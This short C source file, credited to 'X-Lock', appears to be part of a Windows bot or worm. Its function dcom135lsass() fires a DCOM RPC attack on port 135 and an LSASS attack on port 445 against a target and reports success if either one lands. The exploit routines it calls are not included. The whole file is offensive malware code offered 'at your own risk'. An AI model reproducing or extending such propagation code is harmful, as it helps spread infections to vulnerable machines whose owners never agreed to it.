//
// some code that scans dcom135 and lsass by X-Lock
//
// note: absolutely experimental, use at your own risk.
//
//

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_DCOM135LSASS
INT dcom135lsass(EXINFO exinfo) //bool
{
	exinfo.port = 135;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = Lsass(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}
#endif
#endif
#endif